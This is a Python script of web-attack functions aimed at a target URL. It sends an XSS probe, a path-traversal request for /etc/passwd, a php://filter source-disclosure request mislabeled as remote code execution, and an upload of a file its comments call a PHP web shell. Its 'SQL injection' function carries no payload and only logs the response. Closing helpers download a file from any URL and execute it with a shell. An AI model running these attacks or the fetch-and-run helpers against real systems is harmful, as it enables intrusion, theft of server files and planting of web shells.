from rich import print as rprint
import requests
import logging
from urllib.parse import urlparse
import subprocess


def exploit_sql_injection(url, method='GET', params=None):
    """
    Exploits SQL injection vulnerability in the provided URL using the specified HTTP method (GET or POST).

    Parameters:
        url (str): The URL to exploit.
        method (str): The HTTP method to use for the request (GET or POST). Default is GET.
        data (dict): The data to send in the request body (for POST method).
        params (dict): The parameters to include in the URL (for GET method).
    """
    rprint(
        f"[bold red]Exploiting SQL injection vulnerability on {url}[/bold red]")

    if method.upper() == 'GET':
        response = requests.get(url, params=params)
    elif method.upper() == 'POST':
        response = requests.post(url, data=params)
    else:
        rprint(
            "[red bold]Invalid HTTP method. Supported methods are GET and POST.[/red bold]")
        return

    parsed_url = urlparse(url)
    domain = parsed_url.netloc
    logname = f"logs/sinject_{domain}.json"
    logging.basicConfig(filename=logname,
                        filemode='a',
                        format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
                        datefmt='%H:%M:%S',
                        level=logging.INFO)
    logging.info(response.text)
    rprint(
        f"[bold red]Response after exploiting SQL injection: {response.text} [/bold red]")


def exploit_xss_vulnerability(url):
    # Placeholder function for exploiting XSS vulnerability
    rprint(f"[bold red]Exploiting XSS vulnerability on {url}[/bold red]")
    # Example:
    # Inject a script to perform malicious actions in the context of other users
    # e.g., <script>alert('XSS')</script>
    # Inject the script and observe the behavior
    response = requests.get(url + "?input=<script>alert('XSS')</script>")
    rprint(
        f"[bold red]Response after exploiting XSS: {response.text} [/bold red]")


def exploit_directory_traversal(url):
    # Placeholder function for exploiting directory traversal vulnerability
    rprint(
        f"[bold red]Exploiting directory traversal vulnerability on {url} [/bold red]")
    # Example:
    # Attempt to access sensitive files outside of the web root directory
    # e.g., ../../../../../../../etc/passwd
    # Attempt the directory traversal attack and observe the response
    response = requests.get(url + "/../../../../../../../etc/passwd")
    rprint(
        f"[bold red]Response after exploiting directory traversal: {response.text}[/bold red]")


def exploit_remote_code_execution(url):
    # Placeholder function for exploiting remote code execution vulnerability
    rprint(
        f"[bold red]Exploiting remote code execution vulnerability on {url}[/bold red]")
    # Example:
    # Inject code to execute arbitrary commands on the server
    # e.g., php://filter/convert.base64-encode/resource=index
    # Inject the payload and observe the server's response
    response = requests.get(
        url + "?page=php://filter/convert.base64-encode/resource=index")
    rprint(
        f"[bold red]Response after exploiting remote code execution: {response.text}[/bold red]")


def exploit_file_upload(url):
    # Placeholder function for exploiting file upload vulnerability
    rprint(
        f"[bold red]Exploiting file upload vulnerability on {url}[/bold red]")
    # Example:
    # Upload a malicious file containing code or executable payload
    # e.g., a PHP file containing web shell code
    files = {'file': open('malicious.php', 'rb')}
    response = requests.post(url + "/upload", files=files)
    rprint(
        f"[bold red]Response after exploiting file upload: {response.text} [/bold red]")


def download_file(url, save_path):
    # Send a GET request to the URL
    response = requests.get(url)
    # Check if request was successful
    if response.status_code == 200:
        # Write the content to a file
        with open(save_path, 'wb') as f:
            f.write(response.content)
        print("File downloaded successfully.")
    else:
        print("Failed to download file.")


def execute_file(file_path):
    try:
        # Execute the downloaded file
        subprocess.Popen(file_path, shell=True)
        print("File executed successfully.")
    except Exception as e:
        print("Error executing file:", e)
